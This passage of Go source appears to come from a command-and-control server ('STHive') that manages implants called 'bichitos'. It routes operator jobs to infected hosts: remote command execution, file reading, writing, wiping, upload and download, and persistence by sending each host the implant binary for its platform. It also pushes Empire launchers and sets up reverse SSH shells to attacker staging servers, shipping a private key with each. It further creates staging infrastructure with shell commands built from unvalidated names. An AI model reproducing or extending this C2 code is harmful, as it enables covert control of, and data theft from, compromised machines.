	////"Implant Receiving Job Switcher". Jobs that come from users to Footholds	
	}else if strings.Contains(jobO.Chid,"B-") && !strings.Contains(jobO.Pid,"R-"){
		
		var err error
		//Fetch params for Jobs that are not related to Hive
		if !queue{
			bichitosjobqueue.mux.Lock()
			bichitosjobqueue.Jobs = append(bichitosjobqueue.Jobs,jobO)
			bichitosjobqueue.mux.Unlock()
		}
		
		if (bichitosjobqueue.Working){
			return
		}else{
			bichitosjobqueue.mux.Lock()
			bichitosjobqueue.Working = true
			bichitosjobqueue.mux.Unlock()	
		}


		defer bichitosJobFin()

		//Retrieve the redirector that the bichito is in this moment attached to 
        bichitosjobqueue.Jobs[0].Pid,err = getRidbyBid(bichitosjobqueue.Jobs[0].Chid)
        if err != nil {
            //ErrorLog
            time := time.Now().Format("02/01/2006 15:04:05 MST")
            elog := fmt.Sprintf("%s%s","Jobs(Error Getting Rid by Chid):",err.Error())
            go addLogDB("Hive",time,elog)
            return
        } 

    	//Check redundant Jid
    	errJ := addJobDB(bichitosjobqueue.Jobs[0])
    	if errJ != nil {
        	//ErrorLog
        	time := time.Now().Format("02/01/2006 15:04:05 MST")
        	elog := fmt.Sprintf("%s%s","Jobs(Job Already Processed):",errJ.Error())
        	go addLogDB("Hive",time,elog)
        	return
    	}

    	//Put the job on processing status
   		errS := setJobStatusDB(bichitosjobqueue.Jobs[0].Jid,"Processing")
    	if errS != nil {
        	//ErrorLog
       		time := time.Now().Format("02/01/2006 15:04:05 MST")
        	elog := fmt.Sprintf("%s%s","Jobs(Error Setting Job Status to Processing):",errS.Error())
        	go addLogDB("Hive",time,elog)
        	return
    	}


    	//Get data from the first queued Job
		cid = bichitosjobqueue.Jobs[0].Cid
		pid = bichitosjobqueue.Jobs[0].Pid
		chid = bichitosjobqueue.Jobs[0].Chid
		jid = bichitosjobqueue.Jobs[0].Jid
		job = bichitosjobqueue.Jobs[0].Job
		parameters := bichitosjobqueue.Jobs[0].Parameters
		jobO = bichitosjobqueue.Jobs[0]
	
		go bichitoStatus(bichitosjobqueue.Jobs[0])

		switch job{
			
			////Jobs Triggered by users
			
			//Implant Lifecycle
			case "respTime":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			case "ttl":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			/*
				Retrieve target Implant and send it for bichito persistence
				A.Make sure the bichito has checked in
				B.Get Bichito data
				C.Retrieve Bichito Sysinfo
				D.Using the sys. info, target for the right binary to be persisted
				E.Read the binary,encode the content and put it in the result, the bichito is sent to the queue to be sent back to the Implant
			*/
			case "persistence":

				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

				//Check SysInfo, if empty, craft a new Job to retrieve it
				bichito := getBichitoDB(chid)
				if (bichito.Info == "") {
   				
					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Sending","",""}

					jobsToProcess.mux.Lock()
					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
					jobsToProcess.mux.Unlock()
					return
				}

				//Parse sysinfo and get target OS and architecture
				var biInfo *SysInfo
				errDaws := json.Unmarshal([]byte(bichito.Info),&biInfo)
				if errDaws != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errDaws.Error())
					addLogDB("Hive",time,elog)
					return
				}

				//Need to fix this one to just detect "COmpiled for String --> Compiled for x64: Intel x86-64h Haswell"
				compiledFor := strings.Split(biInfo.Arch,":")[0]
				x64 := strings.Contains(compiledFor,"64")
				x32 := strings.Contains(compiledFor,"86")

				windows := strings.Contains(biInfo.Os,"windows")
				linux := strings.Contains(biInfo.Os,"linux")
				darwin := strings.Contains(biInfo.Os,"darwin")

				var implantPath string

				switch{
					case (x32 && windows):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32"
					case (x64 && windows):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx64"
					case (x32 && linux):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx32"
					case (x64 && linux):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx64"
					case (x32 && darwin):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx32"
					case (x64 && darwin):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx64"
					default:
					    time := time.Now().Format("02/01/2006 15:04:05 MST")
						elog := fmt.Sprintf("Error in persistence for: "+chid+" no executablePath found.")
						addLogDB("Hive",time,elog)
						return	
				}


        		//Get Target Implant
        		implant, err := ioutil.ReadFile(implantPath)
        		if err != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Persistence by "+chid+": Error reading implant"+err.Error())
					addLogDB("Hive",time,elog)
					return
        		}

        		//Set the output of the file on "Result"
        		jobO.Result = base64.StdEncoding.EncodeToString(implant)

    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()

				return

			case "removeInfection":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			case "kill":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			//Implant Basic Capabilities
			case "sysinfo":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "exec":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "ls":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "accesschk":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "read":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "write":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "wipe":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "upload":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "download":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			
			//Staging/POST Actions

			/* Generate an Empire launcher using Job data
				A.Decode Job
				B.Generate the launcher using staging data
				C.Send the Job to the Implant with the launcher string within Result
			*/
			case "injectEmpire":

				//Get staging
				//from staging: type,port,domain
    			jsconcommanA := make([]InjectEmpire, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

    			//White List Staging name
    			if !namesInputWhite(commandO.Staging){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-injectEmpire(Report "+jobO.Cid+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

				//Generate target shellcode
				error,launcher := getEmpireLauncher(commandO.Staging,chid)
    			if error != "" {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectEmpire(Generate Launcher error):"+error)
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

				jobO.Parameters = launcher
    			jobsToProcess.mux.Lock()
    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return


			/* Generate an Empire launcher using Job data
				A.Decode Job
				B.Get the Domain for the target staging
				C.Read target staging server pem key
				D.Encode the em key and the user of the rev. ssh within a Job to be sent back to the Bichito
			*/
			case "injectRevSshShell":

				//Get staging
				//from staging: type,port,domain
    			jsconcommanA := make([]InjectEmpire, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

    			if !namesInputWhite(commandO.Staging){
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Hive-injectRevSshShell(Staging "+commandO.Staging+" Incorrect Param. Formatting)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					
					return
    			}


    			domain,err1,err2 := getDomainbyStagingDB(commandO.Staging)
    			if (err1 != nil) || (err2 != nil) {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging Domain):"+err1.Error()+err2.Error())
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}


    			///usr/local/STHive/stagings/%s/implantkey

    			sshkey, err := ioutil.ReadFile("/usr/local/STHive/stagings/"+commandO.Staging+"/implantkey")
    			if err != nil {
        			//ErrorLog
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectRevSshShell(Reading Anonymous Staging Key):"+err1.Error()+err2.Error())
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
        			return
    			}

    			//JSON Encode function params 
    			revssshellhparams := InjectRevSshShellBichito{domain,string(sshkey),"22","anonymous"}
				bufBP := new(bytes.Buffer)
				json.NewEncoder(bufBP).Encode(revssshellhparams)
				resultBP := bufBP.String()

				jobO.Parameters = resultBP
				

				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			case "injectRevSshShellOffline":

				//Get staging
				//from staging: type,port,domain
    			jsconcommanA := make([]InjectRevSshShellBichito, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
					return
    			}

    			//WhiteList Client params

    			if !domainsInputWhite(commandO.Domain){
        			//ErrorLog
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
        			return
    			}

    			if !rsaKeysInputWhite(commandO.Sshkey){
        			//ErrorLog
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
        			return
    			}

    			if !tcpPortInputWhite(commandO.Port){
        			//ErrorLog
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
        			return
    			}

    			if !namesInputWhite(commandO.User){
        			//ErrorLog
					jStatus = setJobStatusDB(jid,"Error")
					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
					if (jStatus != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
        				return
					}
					if (jResult != nil){
        				time := time.Now().Format("02/01/2006 15:04:05 MST")
        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
        				return
					}
        			return
    			}

    			//JSON Encode function params 
    			revssshellhparams := InjectRevSshShellBichito{commandO.Domain,commandO.Sshkey,commandO.Port,commandO.User}
				bufBP := new(bytes.Buffer)
				json.NewEncoder(bufBP).Encode(revssshellhparams)
				resultBP := bufBP.String()

				jobO.Parameters = resultBP
				jobO.Job = "injectRevSshShell"

				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			//SYSTEM Jobs
			//[...]

			//Default if the Job is not implemented
			default:
				time := time.Now().Format("02/01/2006 15:04:05 MST")
				elog := fmt.Sprintf("Job by "+cid+":Bichito(Job not implemented)")
				addLogDB(pid,time,elog)
				return
		}
	
	//"Implant Receiving Job Switcher".Jobs generated by users towards Implants
	}else if strings.Contains(jobO.Chid,"B-") && strings.Contains(jobO.Pid,"R-"){


		cid = jobO.Cid
		pid = jobO.Pid
		chid = jobO.Chid
		jid = jobO.Jid
		job = jobO.Job
		result := jobO.Result
		parameters = jobO.Parameters

		switch job{

			//Main Beacon of Implants, will be used to Check-In Bichitos
			case "BiPing":

				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

				//Check SysInfo, if empty, craft a new Job to retrieve it
				bichito := getBichitoDB(chid)
				if (bichito.Info == "") {
   				
					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Processing","",""}

					jobsToProcess.mux.Lock()
					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
					jobsToProcess.mux.Unlock()
				}

				jobsreceived := &Job{"","",pid,chid,"received","","","",""}

				jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
				jobsToProcess.mux.Unlock()

   				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
   				errSet1 := setRedLastCheckedDB(pid,timeA)
   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
   				errSet3 := setBiRidDB(chid,pid)
   				if (errSet1 != nil){
       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
        			return
   				}
   				if (errSet2 != nil){
       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
        			return
   				}
   				if (errSet3 != nil){
       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
        			return
   				}

				return


			case "sysinfo":
        		err1 := setBiInfoDB(chid,result)
        		if err1 != nil {
            		//ErrorLog
            		time := time.Now().Format("02/01/2006 15:04:05 MST")
            		elog := fmt.Sprintf("%s%s","Jobs(Error Saving Bichito "+chid+" Sysinfo to DB):",err1.Error())
            		go addLogDB("Hive",time,elog)
            		return
        		}
				return

			case "respTime":
        		i, _ := strconv.Atoi(parameters)
        		err2 := setBichitoRespTimeDB(chid,i)
        		if err2 != nil {
            		//ErrorLog
            		time := time.Now().Format("02/01/2006 15:04:05 MST")
            		elog := fmt.Sprintf("%s%s","Jobs(Error Changing Bichito "+chid+" Resptime to DB):",err2.Error())
            		go addLogDB("Hive",time,elog)
            		return
        		}
				return

			case "log":
				
				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

   				jsconcommanA := make([]Log, 0)
   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
   				errD := decoder.Decode(&jsconcommanA)
   				// Error Log
    			if errD != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errD.Error())
					addLogDB("Hive",time,elog)
					return
   				}
   				commandO := jsconcommanA[0]
				addLogDB(chid,commandO.Time,commandO.Error)

				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
   				errSet1 := setRedLastCheckedDB(pid,timeA)
   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
   				errSet3 := setBiRidDB(chid,pid)
   				if (errSet1 != nil){
       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
        			return
   				}
   				if (errSet2 != nil){
       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
        			return
   				}
   				if (errSet3 != nil){
       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
        			return
   				}
				return

			case "persistence":

				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

				//Check SysInfo, if empty, craft a new Job to retrieve it
				bichito := getBichitoDB(chid)
				if (bichito.Info == "") {
   				
					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Sending","",""}

					jobsToProcess.mux.Lock()
					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
					jobsToProcess.mux.Unlock()
					return
				}

				//Parse sysinfo and get target OS and architecture
				var biInfo *SysInfo
				errDaws := json.Unmarshal([]byte(bichito.Info),&biInfo)
				if errDaws != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errDaws.Error())
					addLogDB("Hive",time,elog)
					return
				}

				//Need to fix this one to just detect "COmpiled for String --> Compiled for x64: Intel x86-64h Haswell"
				compiledFor := strings.Split(biInfo.Arch,":")[0]
				x64 := strings.Contains(compiledFor,"64")
				x32 := strings.Contains(compiledFor,"86")

				windows := strings.Contains(biInfo.Os,"windows")
				linux := strings.Contains(biInfo.Os,"linux")
				darwin := strings.Contains(biInfo.Os,"darwin")

				var implantPath string

				switch{
					case (x32 && windows):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32"
					case (x64 && windows):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx64"
					case (x32 && linux):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx32"
					case (x64 && linux):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx64"
					case (x32 && darwin):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx32"
					case (x64 && darwin):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx64"
					default:
					    time := time.Now().Format("02/01/2006 15:04:05 MST")
						elog := fmt.Sprintf("Error in persistence for: "+chid+" no executablePath found.")
						addLogDB("Hive",time,elog)
						return	
				}


        		//Get Target Implant
        		implant, err := ioutil.ReadFile(implantPath)
        		if err != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Persistence by "+chid+": Error reading implant"+err.Error())
					addLogDB("Hive",time,elog)
					return
        		}

        		//Set the output of the file on "Result"
        		jobO.Result = base64.StdEncoding.EncodeToString(implant)

    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()

				return
			

			/*
			If the received Job is not a special one, justand the status of the Bichito(online//offline)
				A. Update the result of the Implant Job within Hive DB
				B. Set Redirector and Bichito last checked time to acknowledge if bichito/redirector is offline/online
				C. Modify the redirector which this Job comes from, so we understand to wich redirector the Online bichito is attached to
			*/
			default:
    			//These Bichito jobs are the ones generated by Users, that came back to be updated with results
    			err2 := updateJobDB(jobO)
    			if err2 != nil {
        			//ErrorLog
        			time := time.Now().Format("02/01/2006 15:04:05 MST")
        			elog := fmt.Sprintf("Job "+jobO.Jid+"Type: "+jobO.Job+"(Not existent or already Finished,Possible Replay attack/Problem):"+err2.Error())
        			go addLogDB("Hive",time,elog)
        			return
    			}			

    			//Update Last Actives and Redirectors/Bichitos if PiggyBAcking Job is correct
    			time1 := time.Now().Format("02/01/2006 15:04:05 MST")
    
    			errRLC := setRedLastCheckedDB(jobO.Pid,time1)
    			if errRLC != nil {
        			//ErrorLog
        			time := time.Now().Format("02/01/2006 15:04:05 MST")
        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting "+jobO.Pid+" lastchecked to DB):",errRLC.Error())
        			go addLogDB("Hive",time,elog)
        			return
    			}    
    
    			errRLB := setBiLastCheckedbyBidDB(jobO.Chid,time1)
    			if errRLB != nil {
        			//ErrorLog
        			time := time.Now().Format("02/01/2006 15:04:05 MST")
        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting "+jobO.Chid+" lastchecked to DB):",errRLB.Error())
        			go addLogDB("Hive",time,elog)
        			return
    			}	    
    
    			errRB := setBiRidDB(jobO.Chid,jobO.Pid)
    			if errRB != nil {
        			//ErrorLog
        			time := time.Now().Format("02/01/2006 15:04:05 MST")
        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting red: "+jobO.Pid+" to bichito: "+jobO.Chid+" to DB):",errRB.Error())
        			go addLogDB("Hive",time,elog)
        			return
    			}    
    
    			return
		
		}

	}
}

//Following functions are called from JobProcessor. Mostly related to Asset creation and support features.


/*
Description: Receive staging data and Bid and generates a "empire launcher" string that adjust to target OS and egress to prepared staging
Working just with python, for the moment.
Flow:
A. Craft the PATH to the previously generated launcher (on staging creation) using staging name
B. Read the launcher and return it
*/
func getEmpireLauncher(stagingName string,bid string) (string,string){

	
	launchertxtpath := "/usr/local/STHive/stagings/"+stagingName+"/pythonLauncher"

    launcher, err := ioutil.ReadFile(launchertxtpath)
    if err != nil {
    	time := time.Now().Format("02/01/2006 15:04:05 MST")
		elog := fmt.Sprintf("Error when trying to read the Empire launcher for staging "+stagingName+":"+err.Error())
		addLogDB("Hive",time,elog)
		return "Error",""
    }	

	return "",string(launcher)

}

/*
Description: Perform the Bichito Checking
Flow:
A. By bichito ID and Red ID, get the needed information to add a new Bichito to the DB
B. Set last checked time on the new created bichito
*/
func biChecking(chid string,pid string,parameters string){

	redirectorId,_ := getRedIdbyRidDB(pid)
	implantId,_ := getImplantIdbyRidDB(pid)
	timeNow := time.Now().Format("02/01/2006 15:04:05 MST")
	implantName,_ := getImplantNamebyIdDB(implantId)
	_,implant := getImplantDB(implantName)
	addBiDB(chid,pid,parameters,timeNow,implant.Ttl,implant.Resptime,"Online",redirectorId,implantId)
	setRedLastCheckedDB(pid,timeNow)	

}


/*
Description: Main Create Staging Asset Function
Flow:
A.Check that the assets provided exist within DB and are available
B.Create target folder for the staging, crafting the right PATH using provided name
C.Get a non-used tunnel Port for the Staging-Hive tunneling (Operators never connect directly to stagings but to Hive)
D.Start routine to generate Staging server with terraform (explained within hvInfra.go)
E.If the Infra generation was sucessful, continue, if not remove folder
F.Set a mark within DB for those assets used (like domains), and create the staging within DB
*/
func createStaging(stagingName string,stype string,parameters string,vpsName string,domainName string) string{

	var errbuf bytes.Buffer
	//Check existence, and validity of provided implant,vps and domains
	//Implant exist

	extvps,_ := existVpsDB(vpsName)
	extdomain,_ := existDomainDB(domainName)
	usedDomain,_ := isUsedDomainDB(domainName)

	if (!extvps && !extdomain && usedDomain){
		elog := fmt.Sprintf("%s","StagingGeneration(NotExisting VPS/Domain,UsedDomain,DB-Error)")
		return elog
	}

	//Create Folder
	stagingFolder := "/usr/local/STHive/stagings/"+stagingName

	mkdir := exec.Command("/bin/sh","-c","mkdir "+stagingFolder)
	mkdir.Stderr = &errbuf
	mkdir.Start()
	mkdir.Wait()
	mkdirErr := errbuf.String()

	if (mkdirErr != ""){
		//ErrorLog
		errorT := mkdirErr
		elog := fmt.Sprintf("%s%s","StagingGeneration(Folder Creation):",errorT)
		return elog
	}

	//Get not used Random TCP Port [0-65535]
	errPort,tunnelPort := getStagingTunnelPortDB() 
	if (errPort != nil){
		//ErrorLog
		errorT := errPort
		elog := fmt.Sprintf("%s%s","StagingGeneration(TunnelPort Choosing):",errorT)
		return elog
	}


	infraResult := generateStagingInfra(stagingName,stype,tunnelPort,parameters,vpsName,domainName)

	//If fails destroy possible created infra and folder
	if infraResult != "Done" {
		
		destroyStagingInfra(stagingName)
		mkdir := exec.Command("/bin/sh","-c","rm -r "+stagingFolder)
		mkdir.Start()
		mkdir.Wait()
		return infraResult
	}
	
	errSet1 := setUsedDomainDB(domainName,"Yes")

    vpsId,_ := getVpsIdbyNameDB(vpsName)
    domainId,_ := getDomainIdbyNameDB(domainName)

	errSet2 := addStagingDB(stagingName,stype,tunnelPort,parameters,vpsId,domainId)

	if (errSet1 != nil) {
		destroyStagingInfra(stagingName)
